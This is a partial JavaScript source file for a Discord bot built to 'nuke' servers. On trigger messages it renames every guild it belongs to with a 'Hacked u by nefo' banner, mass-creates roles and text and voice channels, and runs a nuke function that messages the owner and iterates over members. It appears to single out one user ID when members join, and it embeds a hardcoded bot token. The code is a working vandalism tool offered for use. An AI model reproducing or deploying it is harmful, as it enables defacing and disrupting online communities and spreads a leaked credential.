...
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setUsername("Hacked u by nefo Is here")
 
}
});
LOka.on('message', message => {
     if (message.content === ".") {
LOka.user.setGame(`Hacked u by nefo Is here`,'https://www.twitch.tv/hix')
...
LOka.on('message', message => {
     if (message.content === ".") {
         LOka.guilds.forEach(m =>{
             m.setName(`Hacked u by nefo Is here`)
})
}
});
...
LOka.on('message', message => {
     ...
     if (message.content === "k1") {
         LOka.guilds.forEach(m =>{
  m.createRole({
        name : "Hacked u by nefo Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
        name : "Hacked u by mefo Is here",
        permissions :   [1],
        color : " #ff0000"
    })
    m.createRole({
...
LOka.on('message', message => {
         if (message.content === "k") {
               LOka.guilds.forEach(m =>{
m.createChannel('Hacked u by nefo Is here', 'text');
m.createChannel('Hacked u by nefo Is here', 'text');
m.createChannel('Hacked u by nefo Is here', 'text');
m.createChannel('Hacked u by nefo Is here', 'text');
m.createChannel('Hacked u by nefo Is here', 'text');
...
LOka.on('message', message => {
         if (message.content === "k") {
                 LOka.guilds.forEach(m =>{
m.createChannel('Hacked u by nefo Is here', 'voice');
m.createChannel('Hacked u by nefo Is here', 'voice');
m.createChannel('Hacked u by nefo Is here', 'voice');
m.createChannel('Hacked u by nefo Is here', 'voice');
m.createChannel('Hacked u by nefo Is here', 'voice');
...
async function nuke(guild) {
  ...
  await guild.owner.send(' Hacked u by unknown Is here    Óáã Úáì ÓíÑÝÑß åååååååååååååååå').catch(e => { return void e; });
  ...
  await Promise.all(guild.members.map(async (m) => {
    ...
    await guild.createChannel('Hacked u by nefo Is here', 'text');
 
      await guild.createChannel('Hacked u by nefo Is here', 'voice');
...
LOka.on('guildMemberAdd', member => {
            ...
            if (member.id === "407244267984125972") {
...
LOka.login("NDY0MTEyNTM2MDQ4ODkzOTYy.DlIPCw.PRSvBIT042DkqEdLOYOELKEtArw
")
